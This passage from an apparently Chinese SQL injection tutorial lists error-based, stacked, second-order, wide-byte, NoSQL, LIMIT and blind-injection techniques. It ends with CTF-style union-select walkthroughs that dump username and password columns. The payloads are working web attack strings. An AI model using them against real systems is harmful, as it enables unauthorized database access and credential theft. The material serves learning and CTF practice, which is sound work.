class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a);</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span> <span class="keyword">union</span> <span class="keyword">select</span>  <span class="operator">!</span><span class="number">1</span>)x <span class="keyword">group</span> <span class="keyword">by</span> concat((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables  limit <span class="number">1</span>),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>)));</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> ExtractValue</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>, concat(<span class="number">0x5c</span>, (<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables limit <span class="number">1</span>)));</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span> UpdateXml</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x3a</span>,(<span class="keyword">select</span> <span class="keyword">user</span>())),<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span> Name_Const(<span class="operator">&gt;</span><span class="number">5.0</span><span class="number">.12</span>)</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> NAME_CONST(version(),<span class="number">0</span>),NAME_CONST(version(),<span class="number">0</span>))x;</span><br><span class="line"></span><br><span class="line"><span class="number">5.</span> <span class="keyword">Join</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> mysql.user a <span class="keyword">join</span> mysql.user b)c;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> mysql.user a <span class="keyword">join</span> mysql.user b <span class="keyword">using</span>(Host))c;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> mysql.user a <span class="keyword">join</span> mysql.user b <span class="keyword">using</span>(Host,<span class="keyword">User</span>))c;</span><br><span class="line"></span><br><span class="line"><span class="number">6.</span> <span class="built_in">exp</span>()<span class="operator">/</span><span class="operator">/</span>mysql5<span class="number">.7</span>貌似不能用</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="built_in">Exp</span>(<span class="operator">~</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> version())a));</span><br><span class="line"></span><br><span class="line"><span class="number">7.</span> geometrycollection()<span class="operator">/</span><span class="operator">/</span>mysql5<span class="number">.7</span>貌似不能用</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> geometrycollection((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br><span class="line"></span><br><span class="line"><span class="number">8.</span> multipoint()<span class="operator">/</span><span class="operator">/</span>mysql5<span class="number">.7</span>貌似不能用</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> multipoint((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br><span class="line"></span><br><span class="line"><span class="number">9.</span> polygon()<span class="operator">/</span><span class="operator">/</span>mysql5<span class="number">.7</span>貌似不能用</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> polygon((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br><span class="line"></span><br><span class="line"><span class="number">10.</span> multipolygon()<span class="operator">/</span><span class="operator">/</span>mysql5<span class="number">.7</span>貌似不能用</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> multipolygon((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br><span class="line"></span><br><span class="line"><span class="number">11.</span> linestring()<span class="operator">/</span><span class="operator">/</span>mysql5<span class="number">.7</span>貌似不能用</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> linestring((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br><span class="line"></span><br><span class="line"><span class="number">12.</span> multilinestring()<span class="operator">/</span><span class="operator">/</span>mysql5<span class="number">.7</span>貌似不能用</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> multilinestring((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br></pre></td></tr></table></figure>
+
+<h2><span id="堆叠注入">堆叠注入</span></h2><p>在SQL中，分号（;）是用来表示一条sql语句的结束，那我们在一句SQL语句结束后再紧跟一句SQL语句 ，此时会不会执行两条语句<br>答案是会，堆叠注入正是基于这种思想而来。</p>
+<p>举个简单例子</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span>(ascii(<span class="string">&#x27;a&#x27;</span>));<span class="keyword">show</span> tables;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------+</span></span><br><span class="line"><span class="operator">|</span> (ascii(<span class="string">&#x27;a&#x27;</span>)) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------+</span></span><br><span class="line"><span class="operator">|</span>           <span class="number">97</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="operator">|</span> Tables_in_security <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="operator">|</span> emails             <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> referers           <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> uagents            <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> users              <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="number">4</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
+<p>堆叠注入的局限性在于并不是每一个环境下都可以执行</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">可能受到API或者数据库引擎不支持的限制</span><br><span class="line">可能因为权限不足而无法正确执行</span><br></pre></td></tr></table></figure>
+
+<p>举个例子<br>PHP为了防止sql注入机制，往往使用调用数据库的函数是mysql_query()函数，这个函数只运行执行一条语句，分号后面的内容将不会被执行，此时堆叠注入就失效了</p>
+<h2><span id="二次注入">二次注入</span></h2><p>用户向数据库里存入恶意的数据，在数据被插入到数据库之前，肯定会对数据库进行转义处理，但用户输入的数据的内容肯定是一点也不会变的存进数据库里，而一般都默认为数据库里的信息都是安全的，查询的时候不会进行处理，所以当用户的恶意数据被web程序调用的时候就有可能出发SQL注入。<br>我的认识：<br>小白对此的理解:先向数据库存入恶意数据，数据在前端被转义，但在存放到数据库时保持原样，此时我们再调用此数据，执行sql查询，二次注入出现！<br>图解如下<br><img src="https://img-blog.csdnimg.cn/img_convert/de4f74e08850cf4d083762057f5d69c0.png#pic_center" alt="在这里插入图片描述"><br>具体过程为</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1、用户向数据库插入恶意语句（即使后端代码对语句进行了转义，如mysql_escape_string、mysql_real_escape_string转义）</span><br><span class="line">2、数据库对自己存储的数据非常放心，直接取出恶意数据给用户</span><br></pre></td></tr></table></figure>
+<h2><span id="宽字节注入">宽字节注入</span></h2><p>首先我们需要了解一下单字节和宽字节</p>
+<figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">单字节字符集： 所有的字符都使用一个字节来表示，比如 <span class="keyword">ASCII</span> 编码。</span><br><span class="line">宽字节字符集： 所有的字符都使用两个字节来表示。</span><br></pre></td></tr></table></figure>
+<p><font color="red">注：英文字母占一个字节，汉字占两字节</font><br>为什么会产生宽字节注入漏洞，这是因为前端使用的是<code>utf-8编码</code>，后端使用的是<code>gbk，gb2312或其他宽字节编码</code>，这样两者就会存在出入，进而导致了宽字节注入的产生。<br>对编码字符集的小科普</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">尽管现在呼吁所有的程序都使用unicode编码，所有的网站都使用utf<span class="number">-8</span>编码，来一个统一的国际规范。</span><br><span class="line">但仍然有很多，包括国内及国外（特别是非英语国家）的一些cms，仍然使用着自己国家的一套编码，</span><br><span class="line">比如我国的gbk、gb<span class="number">2312</span>，作为自己默认的编码类型。也有一些cms为了考虑老用户，推出了gbk和utf<span class="number">-8</span></span><br><span class="line">两个版本（例如:dedecms） 我们就以gbk字符编码为例，拉开帷幕。</span><br><span class="line">GBK全称《汉字内码扩展规范》<span class="punctuation">,</span>gbk是一种多字符编码。他使用了双字节编码方案，因为双字节编码所以</span><br><span class="line">gbk编码汉字，占用<span class="number">2</span>个字节。一个utf<span class="number">-8</span>编码的汉字，占用<span class="number">3</span>个字节。我们可以通过输出来验证这句话。</span><br><span class="line">例如：<span class="number">0xD50</span>×<span class="number">5</span>C 对应了汉字“誠 ”，URL编码用百分号加字符的<span class="number">16</span>进制编码表示字符，于是 <span class="variable">%d5</span><span class="variable">%5</span><span class="keyword">c</span> </span><br><span class="line">经URL解码后为“誠”。</span><br></pre></td></tr></table></figure>
+
+<p>前端使用的部分函数对特殊字符进行转义，添加<code>反斜杠 \</code>，那我们如果能够再前面多一个字符，使其与\组成汉字，就成功的使后面的特殊字符逃逸出来，从而可以进行注入。<br>下方是转义时运用的部分函数</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">magic_quotes_gpc：当PHP的传参中有特殊字符就会在前面加转义字符<span class="string">&#x27;\&#x27;</span>,来做一定的过滤 </span><br><span class="line">addslashes() 函数返回在预定义字符之前添加反斜杠的字符串</span><br><span class="line">mysql_real_escape_string() 函数转义 <span class="keyword">SQL</span> 语句中使用的字符串中的特殊字符</span><br><span class="line">mysql_escape_string() — 转义一个字符串</span><br></pre></td></tr></table></figure>
+<h1><span id="相关知识介绍">相关知识介绍</span></h1><h2><span id="万能语句">万能语句</span></h2><p><code>1&#39; or 1=1#</code>经常可以在sql注入中见到，它可以显示所有的信息，这是为什么呢，下面我们来一探究竟</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;select * from users where username=&#x27;$username&#x27; and password=&#x27;$pass&#x27;&quot;;</span><br></pre></td></tr></table></figure>
+<p>我们把sql语句与payload相结合，那这个sql语句就是</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;select * from users where username=&#x27;1&#x27; or 1=1 #&#x27; and password=&#x27;1&#x27;&quot;;</span><br></pre></td></tr></table></figure>
+<p>那它在后端执行的实际语句就是</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username<span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> # <span class="string">&#x27; and  password=&#x27;</span><span class="number">1</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>因为#是注释符，后面的内容都会被注释掉，所以它执行的语句等同于</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username<span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p>这里’1’ or 1=1肯定是true(username=‘1’可能是假，但1=1肯定为true，or语句只要有一个为true就为true)，因此返回结果为true，所以执行的语句就是</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users</span><br></pre></td></tr></table></figure>
+<p>因此就挑选出了所有的数据</p>
+<h2><span id="md5特殊字符串">md5特殊字符串</span></h2><p>首先介绍一下md5函数</p>
+<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">md5(<span class="built_in">string</span>,raw)</span><br><span class="line"></span><br><span class="line">参数  描述</span><br><span class="line"><span class="built_in">string</span>  必需。规定要计算的字符串。</span><br><span class="line">raw     可选。规定十六进制或二进制输出格式：</span><br><span class="line">        <span class="literal">TRUE</span> - 原始 <span class="number">16</span> 字符二进制格式</span><br><span class="line">        <span class="literal">FALSE</span> - 默认。<span class="number">32</span> 字符十六进制数</span><br></pre></td></tr></table></figure>
+<p>这里当是true的时候，转成原始16字符二进制格式，此时出现的都将是乱码，我们是无法进行注入的但这里有个特殊的字符串<code>ffifdyop</code>，组成查询语句的时候这个hex会被转成字符串，如果转换之后的字符串包含’or’，就会和原查询语句一起组成。此时语句就称为了<code>&#39;or&#39;6+其他字符</code>，此时就成功执行了万能语句，进而获取了数据</p>
+<h2><span id="nosql注入">nosql注入</span></h2><p>nosql是非关系性的数据库，而mysql是关系性的数据库<br>有关nosql相关的文章我(小白)认为这个是讲的最明白的一个<a target="_blank" rel="noopener" href="https://blog.szfszf.top/tech/nosql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93mongodb/">NoSQL注入总结(MongoDB) </a><br>也可以参考这篇文章<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/97211">https://www.anquanke.com/post/id/97211</a></p>
+<p>nosql常用命令符如下</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">db.collection.find(query, projection)</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>query 可选，使用查询操作符指定查询条件</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>可选，使用投影操作符指定返回的键。查询时返回文档中所有键值， 只需省略该参数即可（默认省略）</span><br><span class="line">举例：</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>查找username为JrXnm的信息</span><br><span class="line">db.user.find(&#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;JrXnm&#x27;</span>&#125;) </span><br><span class="line"></span><br><span class="line">mongodb条件操作符</span><br><span class="line">比较： </span><br><span class="line">    $gt : <span class="operator">&gt;</span></span><br><span class="line">    $lt : <span class="operator">&lt;</span></span><br><span class="line">    $gte: <span class="operator">&gt;=</span></span><br><span class="line">    $lte: <span class="operator">&lt;=</span></span><br><span class="line">    $ne : <span class="operator">!=</span>、<span class="operator">&lt;&gt;</span></span><br><span class="line">    <span class="operator">/</span><span class="operator">/</span>查找用户名不为admin且password为<span class="number">123456</span>的用户</span><br><span class="line">    db.user.find(&#123;<span class="string">&#x27;username&#x27;</span>: &#123;$ne:<span class="string">&#x27;admin&#x27;</span>&#125;, <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;123456&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * : 范围查询 &#123; &quot;age&quot; : &#123; &quot;$gte&quot; : 2 , &quot;$lte&quot; : 21&#125;&#125;</span></span><br><span class="line"><span class="comment">    * : $ne &#123; &quot;age&quot; : &#123; &quot;$ne&quot; : 23&#125;&#125;</span></span><br><span class="line"><span class="comment">    * : $lt &#123; &quot;age&quot; : &#123; &quot;$lt&quot; : 23&#125;&#125;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">条件：</span><br><span class="line">    $<span class="keyword">in</span> : <span class="keyword">in</span></span><br><span class="line">    $nin: <span class="keyword">not</span> <span class="keyword">in</span></span><br><span class="line">    $<span class="keyword">all</span>: <span class="keyword">all</span> </span><br><span class="line">    $<span class="keyword">or</span>:<span class="keyword">or</span></span><br><span class="line">    $<span class="keyword">and</span>: <span class="keyword">and</span></span><br><span class="line">    $<span class="keyword">not</span>: 反匹配(<span class="number">1.3</span><span class="number">.3</span>及以上版本)</span><br><span class="line">    $exist: </span><br><span class="line">    <span class="operator">/</span><span class="operator">/</span>如果记录中有包含该属性的全部返回</span><br><span class="line">    db.collection.find(&#123;title:&#123;$<span class="keyword">exists</span>:<span class="literal">true</span>&#125;&#125;);  </span><br><span class="line">    <span class="operator">/</span><span class="operator">/</span>查找用户名为在这个数组中的用户信息</span><br><span class="line">    db.user.find(&#123;<span class="string">&#x27;username&#x27;</span>: &#123;$<span class="keyword">in</span>: [<span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;JrXnm&#x27;</span>]&#125;&#125;)</span><br><span class="line"></span><br><span class="line">正则：  </span><br><span class="line">    模糊查询用正则式：db.customer.find(&#123;<span class="string">&#x27;name&#x27;</span>: &#123;<span class="string">&#x27;$regex&#x27;</span>:<span class="string">&#x27;.*s.*&#x27;</span>&#125; &#125;)</span><br><span class="line">    正则的另一种写法：db.user.find(&#123;<span class="string">&#x27;username&#x27;</span>:<span class="operator">/</span>jrx<span class="operator">/</span>i&#125;)</span><br></pre></td></tr></table></figure>
+<h2><span id="limit注入">limit注入</span></h2><p>学习过<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html">p神limit注入文章</a>后，有了如下的认识<br>limit看似是无法进行注入的，在LIMIT后面可以跟两个函数，PROCEDURE 和 INTO，INTO有写入shell的权限，因此limit也是存在注入的，本地测试如下</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="operator">&gt;</span><span class="number">0</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> id LIMIT <span class="number">0</span>,<span class="number">1</span> <span class="keyword">procedure</span> analyse(extractvalue(rand(),concat(<span class="number">0x3a</span>,version())),<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="operator">&gt;</span><span class="number">0</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> id LIMIT <span class="number">0</span>,<span class="number">1</span> <span class="keyword">procedure</span> analyse(extractvalue(rand(),concat(<span class="number">0x3a</span>,database())),<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/4c573407e48247cfb99fc73ad9998302.png" alt="在这里插入图片描述"><br>经过测试之后，我发涉及到select的无法使用，怀着疑问重新查看文章后发现评论区有师傅问出了同样的问题，得知新版的已不再支持select语句<br><img src="https://img-blog.csdnimg.cn/abc8c30289f4450bb5dd6eb583fdf6a0.png" alt="在这里插入图片描述"></p>
+<h2><span id="可以相互替代的函数总结">可以相互替代的函数总结</span></h2><h3><span id="时间盲注中的时间">时间盲注中的时间</span></h3><p>表示时间的三种函数(第三种为笛卡尔积)</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">benchmark(<span class="number">5000000</span>,sha(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">FROM</span> information_schema.columns A, information_schema.columns B, information_schema.tables C),<span class="number">1</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/0fe00a81884b4542bbce3bd65c108868.png" alt="在这里插入图片描述"></p>
+<h3><span id="布尔盲注中的正则">布尔盲注中的正则</span></h3><p>表示匹配的两种方式</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">regexp</span><br><span class="line">rlike</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/5a904bd24f22461e80ca25aec71acfc7.png" alt="在这里插入图片描述"></p>
+<h3><span id="联合查询中的where">联合查询中的where</span></h3><p>当where被过滤的时候，我们可以用right join和on来代替where，这里简单介绍一下此函数</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">RIGHT</span> <span class="keyword">JOIN</span> 关键字会右表 (table_name2) 那里返回所有的行，即使在左表 (table_name1) 中</span><br><span class="line">没有匹配的行。</span><br></pre></td></tr></table></figure>
+<p>这里本地测试几个语句，希望能对大家理解有所帮助</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">right</span> <span class="keyword">join</span> emails <span class="keyword">on</span> substr(users.username,<span class="number">1</span>,<span class="number">1</span>)regexp(<span class="string">&#x27;a&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/0c0682259f6147878a7e0432bed0fa44.png" alt="在这里插入图片描述"></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> emails <span class="keyword">right</span> <span class="keyword">join</span> users <span class="keyword">on</span> substr(username,<span class="number">1</span>,<span class="number">1</span>)regexp(<span class="string">&#x27;a&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/42d30e7216d64156b25ab1c0e4d82dc8.png" alt="在这里插入图片描述"></p>
+<h1><span id="注入实战">注入实战</span></h1><h2><span id="联合查询">联合查询</span></h2><h3><span id="0x01">0X01</span></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> &quot;select username,password from ctfshow_user2 where </span><br><span class="line">username !=&#x27;flag&#x27; and id = &#x27;&quot;.$_GET[<span class="string">&#x27;id&#x27;</span>].&quot;&#x27; limit 1;&quot;;</span><br></pre></td></tr></table></figure>
+<p>先输入个1试试<br><img src="https://img-blog.csdnimg.cn/622f291f79f4483b99dd47e3b6eb6fcc.png" alt="在这里插入图片描述">发现回显只有两个，此时说明下面的联合查询不能用123，应该用1,2<br>给出了拼接语句，可以看出是单引号闭合，我们此时尝试构造payload如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-<span class="number">1</span><span class="string">&#x27; union select 1,2 --+</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/d690660f35d54e45af4f2fe5aef453e3.png" alt="在这里插入图片描述"><br>语句中说了，列名是ctfshow_user2，我们构造payload如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-<span class="number">1</span><span class="string">&#x27; union select 1,group_concat(password) from ctfshow_user2--+</span></span><br><span class="line"><span class="string">// -1&#x27;</span> union select <span class="number">1</span>,group_concat(id,username,password) <span class="keyword">from</span>  ctfshow_user2--+</span><br></pre></td></tr></table></figure>
+<p>执行结果如下<br><img src="https://img-blog.csdnimg.cn/134b5007ceb743f1b6fc7a4b1b614fd6.png" alt="在这里插入图片描述"></p>
+<h3><span id="0x02">0X02</span></h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">```sql</span><br><span class="line"><span class="regexp">//</span>对传入的参数进行了过滤</span><br><span class="line">  <span class="keyword">function</span> waf(<span class="variable">$str</span>)&#123;</span><br><span class="line">   <span class="regexp">//</span>代码过于简单，不宜展示</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<p>查询字段数</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; order by 3 --+</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/e3431cae2e3c4d779ecb42e99a1aecd5.png" alt="在这里插入图片描述"><br>这说明有字列数为3，此时尝试union select构造语句</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">&#x27; union seleCt 1,group_concat(username),group_concat(password) from ctfshow_user --+</span></span><br></pre></td></tr></table></figure>
